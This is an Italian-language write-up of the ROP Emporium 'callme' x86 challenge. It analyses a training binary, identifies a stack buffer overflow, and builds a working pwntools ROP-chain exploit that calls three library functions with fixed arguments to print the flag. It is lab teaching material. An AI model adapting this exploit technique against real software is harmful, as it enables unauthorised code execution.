# callme

- [Binary Analysis - x86](#binary-analysis---x86)
- [Manual Exploit - x86](#manual-exploitation---x86)
- [Capture the flag - x86](#capture-the-flag---x86)

Di seguito lo svolgimento della **challenge 3** di ROP Emporium per le architetture *x86* e *x86-64*.

Link: [https://ropemporium.com/challenge/callme.html](https://ropemporium.com/challenge/callme.html)

## Binary Analysis - x86

La *challenge* mette a disposizione i seguenti file:

```bash
$ ls -lah
total 36K
drwxrwxr-x 2 ap ap 4,0K giu 12 00:18 .
drwxrwxr-x 3 ap ap 4,0K giu 12 00:18 ..
-rwxr-xr-x 1 ap ap 7,4K lug  5  2020 callme32
-rw-r--r-- 1 ap ap   32 lug  5  2020 encrypted_flag.dat
-rw-r--r-- 1 ap ap   16 lug  3  2020 key1.dat
-rw-r--r-- 1 ap ap   16 lug  3  2020 key2.dat
-rwxr-xr-x 1 ap ap 7,0K lug  5  2020 libcallme32.so
```

Tra questi si individuano:

```bash
$ file *.dat
encrypted_flag.dat: Non-ISO extended-ASCII text, with no line terminators
key1.dat:           data
key2.dat:           data
```

che sono file contenenti bytes di *informazioni*.

Oltre a questi sono presenti i  seguenti:

```bash
$ file callme32 
callme32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ca5cba17bcd8926f0cda98986ef619c55023b6d, not stripped

$ file libcallme32.so 
libcallme32.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=816c1579385d969e49df2643528fb7d58e3829af, not stripped
```

Il file `callme32` e' un *eseguibile* ELF 32-bit, mentre il file `libcallme` e' uno **shared object** ELF 32-bit. Entrambi i file sono *not stripped*.

La presenza di un *shared object* suggerisce che il file `libcallme32.so` venga utilizzato da `callme`.

```bash
$ ldd callme32 
        linux-gate.so.1 (0xebb7d000)
        libcallme32.so => ./libcallme32.so (0xebb74000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xeb92e000)
        /lib/ld-linux.so.2 (0xebb7f000)
```

I dubbi erano fondati.

Analizziamo la sicurezza del file `callme32`:

```bash
$ checksec --file=callme32
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    b'.'
    Stripped:   No```

```

Continuiamo l'analisi ispezionando la *symbol table*:

```bash
$ readelf --syms callme32 
    ...
    36: 080486ed    98 FUNC    LOCAL  DEFAULT   14 pwnme
    37: 0804874f    67 FUNC    LOCAL  DEFAULT   14 usefulFunction
    ...
    71: 08048686   103 FUNC    GLOBAL DEFAULT   14 main
    ...
```

E la *dynamic symbol table*, per individuare quali funzioni vengono invocate da `libcallme32`:

```bash
$ readelf --dyn-syms callme32 | grep -E "(callme_.*|main|pwnme|usefulFunction)"
     ...
     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND callme_three
     ...
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND callme_one
     ... 
     11: 00000000     0 FUNC    GLOBAL DEFAULT  UND callme_two
     ...
```

Si prosegue con lo strumento di *binary analysis* **radare** per analizzare il codice di `callme32`.

Si inizia dalla funziona `main`:

```text
┌ 103: int main (char **argv);
│ `- args(sp[0x4..0x4]) vars(1:sp[0xc..0xc])
│ 0x08048686      8d4c2404       lea ecx, [argv]
│ 0x0804868a      83e4f0         and esp, 0xfffffff0
│ 0x0804868d      ff71fc         push dword [ecx - 4]
│ 0x08048690      55             push ebp
│ 0x08048691      89e5           mov ebp, esp
│ 0x08048693      51             push ecx
│ 0x08048694      83ec04         sub esp, 4
│ 0x08048697      a13ca00408     mov eax, dword [loc._edata]           ; obj.__TMC_END__
│                                                                      ; [0x804a03c:4]=0
│ 0x0804869c      6a00           push 0
│ 0x0804869e      6a02           push 2                                ; 2
│ 0x080486a0      6a00           push 0
│ 0x080486a2      50             push eax                              ; FILE*stream
│ 0x080486a3      e888feffff     call sym.imp.setvbuf                  ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│ 0x080486a8      83c410         add esp, 0x10
│ 0x080486ab      83ec0c         sub esp, 0xc
│ 0x080486ae      6820880408     push str.callme_by_ROP_Emporium       ; 0x8048820 ; "callme by ROP Emporium"
│ 0x080486b3      e848feffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x080486b8      83c410         add esp, 0x10
│ 0x080486bb      83ec0c         sub esp, 0xc
│ 0x080486be      6837880408     push str.x86_n                        ; 0x8048837 ; "x86\n"
│ 0x080486c3      e838feffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x080486c8      83c410         add esp, 0x10
│ 0x080486cb      e81d000000     call sym.pwnme
│ 0x080486d0      83ec0c         sub esp, 0xc
│ 0x080486d3      683c880408     push str._nExiting                    ; 0x804883c ; "\nExiting"
│ 0x080486d8      e823feffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x080486dd      83c410         add esp, 0x10
│ 0x080486e0      b800000000     mov eax, 0
│ 0x080486e5      8b4dfc         mov ecx, dword [var_4h]
│ 0x080486e8      c9             leave
│ 0x080486e9      8d61fc         lea esp, [ecx - 4]
└ 0x080486ec      c3             ret

```

Il `main` effettua delle stampe ed invoca la funzione `pwnme`.

```text
┌ 98: sym.pwnme ();
│ afv: vars(1:sp[0x2c..0x2c])
│ 0x080486ed      55             push ebp
│ 0x080486ee      89e5           mov ebp, esp
│ 0x080486f0      83ec28         sub esp, 0x28
│ 0x080486f3      83ec04         sub esp, 4
│ 0x080486f6      6a20           push 0x20                             ; 32
│ 0x080486f8      6a00           push 0
│ 0x080486fa      8d45d8         lea eax, [s]
│ 0x080486fd      50             push eax                              ; void *s
│ 0x080486fe      e83dfeffff     call sym.imp.memset                   ; void *memset(void *s, int c, size_t n)
│ 0x08048703      83c410         add esp, 0x10
│ 0x08048706      83ec0c         sub esp, 0xc
│ 0x08048709      6848880408     push str.Hope_you_read_the_instructions..._n ; 0x8048848 ; "Hope you read the instructions...\n"
│ 0x0804870e      e8edfdffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x08048713      83c410         add esp, 0x10
│ 0x08048716      83ec0c         sub esp, 0xc
│ 0x08048719      686b880408     push 0x804886b                        ; "> " ; const char *format
│ 0x0804871e      e8adfdffff     call sym.imp.printf                   ; int printf(const char *format)
│ 0x08048723      83c410         add esp, 0x10
│ 0x08048726      83ec04         sub esp, 4
│ 0x08048729      6800020000     push 0x200                            ; 512
│ 0x0804872e      8d45d8         lea eax, [s]
│ 0x08048731      50             push eax
│ 0x08048732      6a00           push 0
│ 0x08048734      e887fdffff     call sym.imp.read                     ; ssize_t read(int fildes, void *buf, size_t nbyte)
│ 0x08048739      83c410         add esp, 0x10
│ 0x0804873c      83ec0c         sub esp, 0xc
│ 0x0804873f      686e880408     push str.Thank_you_                   ; 0x804886e ; "Thank you!"
│ 0x08048744      e8b7fdffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x08048749      83c410         add esp, 0x10
│ 0x0804874c      90             nop
│ 0x0804874d      c9             leave
└ 0x0804874e      c3             ret

var void * s @ ebp-0x28
```

Oltre a stampare, invoca anche la funzione `read` che legge dallo **stdin** ed alloca *512* bytes in sullo *stack* a partire da *s*.
 
Si individua una **buffer overflow vulnerability**.

Di seguito il *payload* per sovvrascrivere il *saved eip* e mandare in *crash* il programma:

- **padding** di dimensione 0x28 + 0x4 bytes.
- **dummy saved eip** di dimensione 0x4 bytes.

Analizziamo il comportamento del programma inviando per prima un *input* sano che non sovvrascrive *saved ebp* e *saved eip*:

```bash
$ ./callme32 
callme by ROP Emporium
x86

Hope you read the instructions...

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you!

Exiting

```

Inviando il *payload* definito il precedenza sovvrascrivendo *saved ebp* con "BBBB" e *saved eip* con "CCCC":

```bash
$ ./callme32 
callme by ROP Emporium
x86

Hope you read the instructions...

> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
Thank you!
Segmentation fault (core dumped)

$ sudo dmesg 
[ 8477.097150] callme32[6043]: segfault at 43434343 ip 0000000043434343 sp 00000000fffa6400 error 14 in libc.so.6[f3b16000+20000] likely on CPU 0 (core 0, socket 0)
[ 8477.097170] Code: Unable to access opcode bytes at 0x43434319.
```

Funziona!

Continuiamo l'analisi ispezionando il codice di `usefulFunction`:

```bash
┌ 67: sym.usefulFunction (); // noreturn
│ 0x0804874f      55             push ebp
│ 0x08048750      89e5           mov ebp, esp
│ 0x08048752      83ec08         sub esp, 8
│ 0x08048755      83ec04         sub esp, 4
│ 0x08048758      6a06           push 6                                ; 6
│ 0x0804875a      6a05           push 5                                ; 5
│ 0x0804875c      6a04           push 4                                ; eflags
│ 0x0804875e      e87dfdffff     call sym.imp.callme_three
│ 0x08048763      83c410         add esp, 0x10
│ 0x08048766      83ec04         sub esp, 4
│ 0x08048769      6a06           push 6                                ; 6
│ 0x0804876b      6a05           push 5                                ; 5
│ 0x0804876d      6a04           push 4                                ; eflags
│ 0x0804876f      e8dcfdffff     call sym.imp.callme_two
│ 0x08048774      83c410         add esp, 0x10
│ 0x08048777      83ec04         sub esp, 4
│ 0x0804877a      6a06           push 6                                ; 6
│ 0x0804877c      6a05           push 5                                ; 5
│ 0x0804877e      6a04           push 4                                ; eflags
│ 0x08048780      e86bfdffff     call sym.imp.callme_one
│ 0x08048785      83c410         add esp, 0x10
│ 0x08048788      83ec0c         sub esp, 0xc
│ 0x0804878b      6a01           push 1                                ; 1 ; int status
└ 0x0804878d      e87efdffff     call sym.imp.exit                     ; void exit(int status)

```

La funzione invoca in sequenza `callme_one`, `callme_two` e `callme_three` ed infine invoca la `exit` per la terminazione del programma. 

Si pensa di modificare il *payload* in modo da sovvrascrivere il *saved eip* con l'indirizzo di memoria della funzione `usefulFunction` (si ricorda che il binario e' **NO PIE**):

- **padding** di dimensione 0x28 + 0x4 bytes.
- **usefulFuntion address**.

```bash
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*0x28 + b"B"*0x4 + b"\x4f\x87\x04\x08"*0x4)' | ./callme32 
callme by ROP Emporium
x86

Hope you read the instructions...

> Thank you!
Incorrect parameter

```

In questo caso viene stampato il messaggio`"Incorrect parameter"` ed il programma non va in *crash*.

Questo suggerisce che la funzione `usefulFunction` e' stata invocata.

Il passo successivo e' quello di ispezionare il codice delle funzioni `callme` definito in `libcallme32.so`.

```bash
┌ 280: sym.callme_one (uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h);                                                                                                                                                                                                             
│ `- args(sp[0x4..0xc]) vars(2:sp[0x8..0x10])                                                                                                                                                                                                                                           
│ 0x0000063d      55             push ebp                                                                                                                                                                                                                                               
│ 0x0000063e      89e5           mov ebp, esp                                                                                                                                                                                                                                           
│ 0x00000640      53             push ebx                                                                                                                                                                                                                                               
│ 0x00000641      83ec14         sub esp, 0x14                                                                                                                                                                                                                                          
│ 0x00000644      e8f7feffff     call entry0                                                                                                                                                                                                                                            
│ 0x00000649      81c3b7190000   add ebx, 0x19b7                                                                                                                                                                                                                                        
│ 0x0000064f      817d08efbe..   cmp dword [arg_8h], 0xdeadbeef                                                                                                                                                                                                                         
│ 0x00000656      0f85d7000000   jne 0x733                                                                                                                                                                                                                                              
| // true: 0x00000733  false: 0x0000065c                                                                                                                                                                                                                                                
│ 0x0000065c      817d0cbeba..   cmp dword [arg_ch], 0xcafebabe                                                                                                                                                                                                                         
│ 0x00000663      0f85ca000000   jne 0x733                                                                                                                                                                                                                                              
| // true: 0x00000733  false: 0x00000669                                                                                                                                                                                                                                                
│ 0x00000669      817d100df0..   cmp dword [arg_10h], 0xd00df00d                                                                                                                                                                                                                        
│ 0x00000670      0f85bd000000   jne 0x733                                                                                                                                                                                                                                              
| // true: 0x00000733  false: 0x00000676
│ 0x00000676      c745f40000..   mov dword [stream], 0
│ 0x0000067d      83ec08         sub esp, 8
│ 0x00000680      8d8300eaffff   lea eax, [ebx - 0x1600]
│ 0x00000686      50             push eax                              ; const char *mode
│ 0x00000687      8d8302eaffff   lea eax, [ebx - 0x15fe]
│ 0x0000068d      50             push eax                              ; const char *filename
│ 0x0000068e      e87dfeffff     call sym.imp.fopen                    ; file*fopen(const char *filename, const char *mode)
...
│ 0x000006f4      8b8330000000   mov eax, dword [ebx + 0x30]
│ 0x000006fa      83ec04         sub esp, 4
│ 0x000006fd      ff75f4         push dword [stream]                   ; FILE *stream
│ 0x00000700      6a21           push 0x21                             ; '!' ; int size
│ 0x00000702      50             push eax                              ; char *s
│ 0x00000703      e8b8fdffff     call sym.imp.fgets                    ; char *fgets(char *s, int size, FILE *stream)
│ 0x00000708      83c410         add esp, 0x10
│ 0x0000070b      898330000000   mov dword [ebx + 0x30], eax
│ 0x00000711      83ec0c         sub esp, 0xc
│ 0x00000714      ff75f4         push dword [stream]                   ; FILE *stream
│ 0x00000717      e8b4fdffff     call sym.imp.fclose                   ; int fclose(FILE *stream)
...
│ 0x00000733      83ec0c         sub esp, 0xc
│ 0x00000736      8d8372eaffff   lea eax, [ebx - 0x158e]
│ 0x0000073c      50             push eax                              ; const char *s
│ 0x0000073d      e8aefdffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x00000742      83c410         add esp, 0x10
│ 0x00000745      83ec0c         sub esp, 0xc
│ 0x00000748      6a01           push 1                                ; int status
│ 0x0000074a      e8b1fdffff     call sym.imp.exit                     ; void exit(int status)

│ ; CODE XREF from sym.callme_one @ 0x731(x)
│ 0x0000074f      90             nop
│ 0x00000750      8b5dfc         mov ebx, dword [var_4h]
│ 0x00000753      c9             leave
└ 0x00000754      c3             ret
```

Si e' deciso di riportare solo alcune righe del codice della funzione `callme_one`, anche perche' le altre hanno un comportamento simile a questa ( ed anche perche' sarebbero troppo ingombranti per il report :3 ). 

Tutte e tre le funzioni `callme` presenti nella libreria accettano tre parametri, questi vengono confrontati con i seguenti valori:

- **param1**: 0xdeadbeef
- **param2**: 0xcafebabe
- **param3**: 0xd00df00d

In caso di non uguaglianza viene stampata la stringa vista in precedenza ed il programma viene terminato.

Altrimenti, si prosegue l'esecuzione del programma e si invoca alcune funzione utilizzate per l'elaborazioe di *file* (`fopen`, `fgets`, `fclose`).

Idea!

Modifichaimo il comportamento del programma `callme32` in modo da eseguire la sequenza `callme_one`, `callme_two` e `callme_three` con i parametri adeguati per superare i *checks* iniziali.

Da qui si intuisce anche la funzione dei tre file allegati alla challenge.

Modifichiamo il *payload* per alterare il programma come segue:

- **padding** di dimensione 0x28 + 0x4 bytes.
- invoca **callme_one**(**param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d)
- invoca **callme_two**(**param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d)
- invoca **callme_three**(**param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d)

## Manual Exploitation - x86

Prima di procedere, bisogna ricavare gli indirizzi di memoria del codice da utilizzare per invocare:

- **callme_one**
- **callme_two**
- **callme_three**

La funzione *usefulFunction* contiene delle `call callme_*` che non fanno al caso nostro. 

Il problema e' che l'istruzione `call` prepara lo *stack frame* effettuando una *push eip*, e quindi memorizzando come *saved eip* l'indirizzo subito successivo alla *callme_\**.

Si potrebbe utilizzare la **plt**, che avvia il *lazy binding* per l'aggiornamento delle entry della *got.plt* per l'invocazione delle funzioni dalla libreria `libcallme32`.

```
[0x0804874f]> s sym.imp.callme_
sym.imp.callme_three   sym.imp.callme_one     sym.imp.callme_two     
[0x0804874f]> s sym.imp.callme_one 
[0x080484f0]> pdfr
  ; CALL XREF from sym.usefulFunction @ 0x8048780(x)
┌ 6: sym.imp.callme_one ();
└ 0x080484f0      ff2518a00408   jmp dword [reloc.callme_one]          ; 0x804a018

[0x080484f0]> s sym.imp.callme_two
[0x08048550]> pdfr
  ; CALL XREF from sym.usefulFunction @ 0x804876f(x)
┌ 6: sym.imp.callme_two ();
└ 0x08048550      ff2530a00408   jmp dword [reloc.callme_two]          ; 0x804a030 ; "V\x85\x04\b"

[0x08048550]> s sym.imp.callme_three
[0x080484e0]> pdfr
  ; CALL XREF from sym.usefulFunction @ 0x804875e(x)
┌ 6: sym.imp.callme_three ();
└ 0x080484e0      ff2514a00408   jmp dword [reloc.callme_three]        ; 0x804a014

```

- **callme_one**: 0x080484f0
- **callme_two**: 0x08048550
- **callme_three**: 0x080484e0

Adesso si solleva una nuova questione:

- **padding** di dimensione 0x28 + 0x4 bytes.	
- **callme_one**					<= saved eip di pwn_me
- **callme_two**					<= saved eip di callme_one
- **param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d

Come invocare **callme_three**?

Il problema e' che per la "convezione di chiamata a funzione x86" il *saved eip* si deve trovare in cima allo stack seguito dagli argomenti della funzione.

Si deve trovare un modo che ci permetta di agirare questo problema.

L'idea e' di cercare dei *gadget* che permettano di "pulire" lo stack prima della prossima invocazione.

Si utilizza **ropper** per la ricerca dei *gadget*:

```bash
$ ropper --file=callme32 --search pop
...
0x080487f9: pop esi; pop edi; pop ebp; ret; 
...
```

Questo sembra fare al caso nostro, l'idea quella di costruire una *rop chain* dalla forma seguente:

- **padding** di dimensione 0x28 + 0x4 bytes.
- **callme_one**                                            <= saved eip di pwn_me
- **pop_params_ret**: pop esi; pop edi; pop ebp; ret        <= saved eip di callme_one
- **param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d
- **callme_two**                                            <= saved eip di callme_one
- **pop_params_ret**: pop esi; pop edi; pop ebp; ret        <= saved eip di callme_two
- **param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d
- **callme_three**                                          <= saved eip di callme_two
- **pop_params_ret**: pop esi; pop edi; pop ebp; ret        <= saved eip di callme_three
- **param1**: 0xdeadbeef, **param2**: 0xcafebabe, **param3**: 0xd00df00d
- **exit**
- **status code**: 0x0

Alla fine della *rop chain* si invoca anche una *exit(0)* per una terminazione senza errori del programma.

## Capture The Flag - x86

Si definisce il file `exploit.py` e si utilizza la libreria *pwntools* per costruire ed usare la nostra *rop chain*:

```python
from pwn import *

exe = './callme32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

### Crafting the ROP chain ###

param1=0xdeadbeef
param2=0xcafebabe
param3=0xd00df00d

"""
===========================================
ROP chain:
============================================
callme_one
pop esi; pop edi; pop ebp; ret;
params
--------------------------------------------
callme_two
pop esi; pop edi; pop ebp; ret;
paramas
-------------------------------------------
callme_three
pop esi; pop edi; pop ebp; ret;
params
-------------------------------------------
exit
0
"""

# @plt
callme_one=0x080484f0
callme_two=0x08048550
callme_three=0x080484e0

# @usefulFunction: call exit
call_exit=0x0804878d

# $ ropper --file=callme32 --search pop
pop_params_ret=0x080487f9

padding='A'*44

payload=flat([
    padding.encode(),
    callme_one, pop_params_ret,
    param1, param2, param3,
    callme_two, pop_params_ret,
    param1, param2, param3,
    callme_three, pop_params_ret,
    param1, param2, param3,
    call_exit,
    0
    ])

### Send the payload ###

io=process([exe])
io.sendline(payload)
io.recvall()
io.close()

```

Di seguito il risultato dell'*exploit* lanciato:

```bash
$ python3 exploit.py 
[+] Starting local process './callme32': pid 7174
[DEBUG] Sent 0x71 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  f0 84 04 08  │AAAA│AAAA│AAAA│····│
    00000030  f9 87 04 08  ef be ad de  be ba fe ca  0d f0 0d d0  │····│····│····│····│
    00000040  50 85 04 08  f9 87 04 08  ef be ad de  be ba fe ca  │P···│····│····│····│
    00000050  0d f0 0d d0  e0 84 04 08  f9 87 04 08  ef be ad de  │····│····│····│····│
    00000060  be ba fe ca  0d f0 0d d0  8d 87 04 08  00 00 00 00  │····│····│····│····│
    00000070  0a                                                  │·│
    00000071
[+] Receiving all data: Done (169B)
[*] Process './callme32' stopped with exit code 0 (pid 7174)
[DEBUG] Received 0xa9 bytes:
    b'callme by ROP Emporium\n'
    b'x86\n'
    b'\n'
    b'Hope you read the instructions...\n'
    b'\n'
    b'> Thank you!\n'
    b'callme_one() called correctly\n'
    b'callme_two() called correctly\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'

```

Eureka!

---
